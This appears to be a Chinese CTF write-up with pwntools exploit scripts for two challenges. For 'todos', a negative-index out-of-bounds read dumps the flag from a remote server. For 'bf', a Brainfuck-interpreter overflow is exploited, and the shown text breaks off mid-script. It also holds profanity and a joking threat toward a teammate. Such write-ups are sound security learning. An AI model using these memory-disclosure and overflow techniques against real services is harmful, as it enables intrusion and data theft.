<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-bash language-bash"><span style="color:#59873A">$</span><span style="color:#B56959"> file</span><span style="color:#B56959"> todos</span><br><span style="color:#59873A">todos:</span><span style="color:#B56959"> ELF</span><span style="color:#B56959"> 64-bit</span><span style="color:#B56959"> LSB</span><span style="color:#B56959"> executable,</span><span style="color:#B56959"> x86-64,</span><span style="color:#B56959"> version</span><span style="color:#2F798A"> 1</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">GNU/Linux</span><span style="color:#2993a3">)</span><span style="color:#393A34">, statically linked, </span><span style="color:#B07D48">BuildID</span><span style="color:#2993a3">[</span><span style="color:#B07D48">sha1</span><span style="color:#2993a3">]</span><span style="color:#999999">=</span><span style="color:#B56959">84f666f27998b6edf31415eb4079223c150c9c28,</span><span style="color:#59873A"> for</span><span style="color:#B56959"> GNU/Linux</span><span style="color:#B56959"> 3.2.0,</span><span style="color:#B56959"> not</span><span style="color:#B56959"> stripped</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-bash language-bash"><span style="color:#80A665">$</span><span style="color:#C98A7D"> file</span><span style="color:#C98A7D"> todos</span><br><span style="color:#80A665">todos:</span><span style="color:#C98A7D"> ELF</span><span style="color:#C98A7D"> 64-bit</span><span style="color:#C98A7D"> LSB</span><span style="color:#C98A7D"> executable,</span><span style="color:#C98A7D"> x86-64,</span><span style="color:#C98A7D"> version</span><span style="color:#4C9A91"> 1</span><span style="color:#DBD7CAEE"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">GNU/Linux</span><span style="color:#5eaab5">)</span><span style="color:#DBD7CAEE">, statically linked, </span><span style="color:#BD976A">BuildID</span><span style="color:#5eaab5">[</span><span style="color:#BD976A">sha1</span><span style="color:#5eaab5">]</span><span style="color:#666666">=</span><span style="color:#C98A7D">84f666f27998b6edf31415eb4079223c150c9c28,</span><span style="color:#80A665"> for</span><span style="color:#C98A7D"> GNU/Linux</span><span style="color:#C98A7D"> 3.2.0,</span><span style="color:#C98A7D"> not</span><span style="color:#C98A7D"> stripped</span><br></code></pre></div>
<p>到这里已经初见端倪了，是的，出题人不是人，没看出来也没关系，继续做。</p>
<p><img loading="lazy" decoding="async" fetchpriority="auto" src="https://pic1.imgdb.cn/item/6821604458cb8da5c8ecc5bc.png" alt="image.png"/></p>
<p>菜单题，那感觉可能比较复杂了，估计得逐个逆向</p>
<p>题目提示说这是整数溢出…..看了一会，感觉按照题目这个检查方法，应该不可能溢出啊？？？在这里卡了很久，找不到🕳</p>
<p><img loading="lazy" decoding="async" fetchpriority="auto" src="https://pic1.imgdb.cn/item/6821606858cb8da5c8ecc5e9.png" alt="image.png"/></p>
<p>（怀疑人生.jpg）</p>
<p>随便输入了一些 fuzz 一下，结果出现了非预期的输出？我草？</p>
<p>仔细看一下，在源码里是这么写的：</p>
<p><img loading="lazy" decoding="async" fetchpriority="auto" src="https://pic1.imgdb.cn/item/6821608b58cb8da5c8ecc5f1.png" alt="image.png"/></p>
<p>ida 逆向出来是这样的：</p>
<p><img loading="lazy" decoding="async" fetchpriority="auto" src="https://pic1.imgdb.cn/item/682160ac58cb8da5c8ecc609.png" alt="image.png"/></p>
<p>？给的源代码和可执行文件不一样，给源代码的意义是什么呢？？？？？</p>
<p>到这你会觉得出题人确实不太诗人，别急。</p>
<p>刚才说了这是个菜单题，仔细看一下功能，想了想，似乎只需要 print_todo 这一个功能就能把内存里的 flag 打印出来了吧？</p>
<p>不太确定，写个脚本看看：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./todos_arm</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">charful.chals.damctf.xyz</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 30128</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    b *0x4019D5</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">What would you like to do? </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> show</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Which TODO would you like to print? </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#AB5959">-</span><span style="color:#2F798A">330</span><span style="color:#999999">,</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">300</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    res </span><span style="color:#999999">=</span><span style="color:#393A34"> i </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffffffff</span><br><span style="color:#393A34">    log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"res => </span><span style="color:#1e754f">{</span><span style="color:#393A34">i</span><span style="color:#1e754f">}</span><span style="color:#B56959"> => </span><span style="color:#1e754f">{</span><span style="color:#393A34">res</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    show</span><span style="color:#2993a3">(</span><span style="color:#393A34">res</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./todos_arm</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">charful.chals.damctf.xyz</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 30128</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    b *0x4019D5</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">What would you like to do? </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> show</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Which TODO would you like to print? </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">330</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">300</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffffffff</span><br><span style="color:#DBD7CAEE">    log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"res => </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">}</span><span style="color:#C98A7D"> => </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">res</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    show</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>？</p>
<p><img loading="lazy" decoding="async" fetchpriority="auto" src="https://pic1.imgdb.cn/item/682160c258cb8da5c8ecc614.png" alt="image.png"/></p>
<p>直接出了？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p>
<p>不是哥们？那你他妈写那么多功能干嘛？</p>
<p>哦对，为什么第一次只找到了一半的 flag 呢？哈哈，因为靶机远程太卡了，第一次爆到一半 dump 了，还好我自信😁</p>
<p>以后 daimi 再让我做这种傻逼题我就把 daimi 杀了。</p>
<h2 id="bf" class="scroll-target"><a href="#bf"><code class="hash inline-code">#</code>bf</a></h2>
<p>存在溢出漏洞，简单利用即可</p>
<p>Zzz</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0"># >,    //读入一个字符n，代表我们要输入字符的个数</span><br><span style="color:#A0ADA0"># [</span><br><span style="color:#A0ADA0">#   [>] //向右移动到第一个0字符的位置（字符串头</span><br><span style="color:#A0ADA0">#   ,   //输入字符</span><br><span style="color:#A0ADA0">#   [&#x3C;] //向左移动到第一个0字符串位置（字符串尾</span><br><span style="color:#A0ADA0">#   >-  //向右移动到n并将其-1</span><br><span style="color:#A0ADA0"># ]     //若为0跳出循环</span><br><br><span style="color:#A0ADA0"># -     //剩下的we don't care</span><br><span style="color:#A0ADA0"># [>]</span><br><span style="color:#A0ADA0"># -</span><br><span style="color:#A0ADA0"># [&#x3C;.+]</span><br><span style="color:#A0ADA0"># ++++++++++.</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD"># >,    //读入一个字符n，代表我们要输入字符的个数</span><br><span style="color:#758575DD"># [</span><br><span style="color:#758575DD">#   [>] //向右移动到第一个0字符的位置（字符串头</span><br><span style="color:#758575DD">#   ,   //输入字符</span><br><span style="color:#758575DD">#   [&#x3C;] //向左移动到第一个0字符串位置（字符串尾</span><br><span style="color:#758575DD">#   >-  //向右移动到n并将其-1</span><br><span style="color:#758575DD"># ]     //若为0跳出循环</span><br><br><span style="color:#758575DD"># -     //剩下的we don't care</span><br><span style="color:#758575DD"># [>]</span><br><span style="color:#758575DD"># -</span><br><span style="color:#758575DD"># [&#x3C;.+]</span><br><span style="color:#758575DD"># ++++++++++.</span><br></code></pre></div>
<p>exp：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#393A34">filename</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">./bf</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">libc</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">'</span><br><br><span style="color:#393A34">sla </span><span style="color:#999999">=</span><span style="color:#AB5959"> lambda</span><span style="color:#393A34"> x</span><span style="color:#999999">,</span><span style="color:#393A34">s </span><span style="color:#999999">:</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#999999">,</span><span style="color:#393A34">s</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">sl </span><span style="color:#999999">=</span><span style="color:#AB5959"> lambda</span><span style="color:#393A34"> s </span><span style="color:#999999">:</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">s</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">sa </span><span style="color:#999999">=</span><span style="color:#AB5959"> lambda</span><span style="color:#393A34"> x</span><span style="color:#999999">,</span><span style="color:#393A34">s </span><span style="color:#999999">:</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#999999">,</span><span style="color:#393A34">s</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">s </span><span style="color:#999999">=</span><span style="color:#AB5959"> lambda</span><span style="color:#393A34"> s </span><span style="color:#999999">:</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">s</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># p=process(filename)</span><br><span style="color:#A0ADA0"># e=ELF(filename)</span><br><span style="color:#393A34">libc</span><span style="color:#999999">=</span><span style="color:#393A34">ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">debug</span><span style="color:#B5695977">'</span><br><span style="color:#A0ADA0"># context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)</span><br><span style="color:#A0ADA0"># gdb.attach(p)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> translate</span><span style="color:#2993a3">(</span><span style="color:#393A34">code</span><span style="color:#999999">:</span><span style="color:#998418"> str</span><span style="color:#999999">,</span><span style="color:#393A34"> output</span><span style="color:#AB5959">=</span><span style="color:#1E754F">None</span><span style="color:#999999">,</span><span style="color:#393A34"> start</span><span style="color:#AB5959">=</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#393A34"> depth</span><span style="color:#AB5959">=</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> output </span><span style="color:#AB5959">is</span><span style="color:#1E754F"> None</span><span style="color:#999999">:</span><br><span style="color:#393A34">        output </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> *</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">code</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    sp </span><span style="color:#999999">=</span><span style="color:#393A34"> start</span><br><span style="color:#393A34">    loop_start </span><span style="color:#999999">=</span><span style="color:#393A34"> start</span><br><br><span style="color:#1E754F">    while</span><span style="color:#393A34"> sp </span><span style="color:#AB5959">&#x3C;</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">code</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> and</span><span style="color:#393A34"> code</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> !=</span><span style="color:#B5695977"> '</span><span style="color:#A65E2B">\0</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">        ch </span><span style="color:#999999">=</span><span style="color:#393A34"> code</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><br><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">></span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 1</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">&#x3C;</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 2</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">.</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 3</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">,</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 4</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">+</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 5</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">-</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 6</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">[</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFF00</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#2F798A"> 7</span><br><span style="color:#393A34">            jump_target </span><span style="color:#999999">=</span><span style="color:#393A34"> translate</span><span style="color:#2993a3">(</span><span style="color:#393A34">code</span><span style="color:#999999">,</span><span style="color:#393A34"> output</span><span style="color:#999999">,</span><span style="color:#393A34"> sp </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#393A34"> depth </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            if</span><span style="color:#393A34"> jump_target </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">                return</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">            output</span><span style="color:#2993a3">[</span><span style="color:#393A34">sp</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">jump_target </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFF</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">output</span><span style="color:#1e754f">[</span><span style="color:#393A34">sp</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFF</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            sp </span><span style="color:#999999">=</span><span style="color:#393A34"> jump_target</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> ch </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">]</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            if</span><span style="color:#393A34"> depth </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span 